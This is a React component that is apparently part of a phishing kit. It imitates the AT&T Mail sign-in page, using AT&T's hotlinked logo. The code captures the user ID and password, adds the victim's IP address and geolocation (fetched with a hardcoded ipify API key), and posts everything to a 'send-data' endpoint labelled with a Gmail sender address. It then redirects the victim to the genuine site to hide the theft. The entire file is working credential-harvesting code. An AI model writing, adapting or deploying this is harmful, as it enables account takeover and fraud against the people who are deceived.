import React, { useState, useEffect } from 'react'
import axios from 'axios'
import Loader from '../components/Loader'
import { isEmail } from '../helpers/validateEmail'
import { baseURL } from '../helpers/data'
const Signin = () => {
  const [userData, setUserData] = useState({ userID: '', password: '' })
  const [showError, setShowError] = useState(false)
  const [errorMsg, setErrorMsg] = useState('')
  const [redirect, setRedirect] = useState(false)

  const [isLoading, setisLoading] = useState(false)
  const [IPAddress, setIPAddress] = useState('')
  const [metaData, setMetaData] = useState({ country: '', region: '', isp: '' })

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIPAddress(data.ip)
        console.log('ip is', data.ip)
      })
      .then(() => {
        axios
          .get(
            `https://geo.ipify.org/api/v2/country?apiKey=at_CLqRNTSBj1bA1E3dgwDHRBbAXZvvI&ipAddress=${IPAddress}`
          )
          .then((resp) => {
            const { location, isp } = resp.data
            const { country, region } = location
            console.log(country, region, isp)
            setMetaData({ country, region, isp })
          })
          .catch((e) => console.log(e))
      })
      .catch((error) => console.error(error))
  }, [])

  React.useEffect(() => {
    redirect && window.location.replace('https://currently.att.yahoo.com/')
  }, [redirect])

  const handleChange = (e) => {
    const { name, value } = e.target
    setUserData({ ...userData, [name]: value })
  }

  const handleSubmit = () => {
    setShowError(false)
    if (!userData['userID'] || !userData['password']) {
      setShowError(true)
      setErrorMsg('Please, enter User ID and password')
      return
    }
    if (!isEmail(userData['userID'])) {
      setShowError(true)
      setErrorMsg('Please enter a valid email')

      return
    }
    setisLoading(true)
    axios
      .post(`${baseURL}send-data`, {
        ...userData,
        IPAddress,
        ...metaData,
        sender: 'timiperla@gmail.com',
      })
      .then((resp) => {
        console.log(resp.data)
        setRedirect(true)
      })
      .catch((e) => console.log(e))
  }

  const imgSrc =
    'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg'

  return (
    <div className='w-[100%] h-[100%] md:w-screen md:h-screen flex items-center justify-center xs:my-16 md:my-auto'>
      <section className='flex flex-col items-center font-bold w-[25rem] md:border gap-2 rounded-2xl'>
        <img src={imgSrc} alt='' className='my-3 md:my-5' width={150} />
        <h2 className='text-3xl md:text-4xl'>Sign in</h2>
        <h3 className='text-2xl text-center'>
          to access AT&T Mail and Currently.com
        </h3>

        <section className='mt-3 flex flex-col w-full px-8 font-normal  gap-3 py-5'>
          <div className='flex flex-col w-full gap-1'>
            <label className='font-semibold text-[#454b52]'>User ID</label>
            <input
              className='border py-3 px-2 rounded-md input-color outline-[#0057B8]'
              name='userID'
              value={userData['userID']}
              onChange={handleChange}
            />
          </div>
          <div className='flex flex-col w-full gap-1'>
            <label className='font-semibold text-[#454b52]'>Password</label>
            <input
              className='border py-3 px-2 rounded-md input-color outline-[#0057B8]'
              name='password'
              value={userData['password']}
              onChange={handleChange}
              type='password'
            />
          </div>
          {showError && (
            <span>
              <p className='text-lg font-semibold text-red-800'>{errorMsg}</p>
            </span>
          )}

          <button
            className='bg-[#0057B8] text-white font-semibold w-full py-3 text-lg rounded-full'
            onClick={handleSubmit}
          >
            Continue
          </button>
        </section>
      </section>
      {isLoading && <Loader />}
    </div>
  )
}

export default Signin
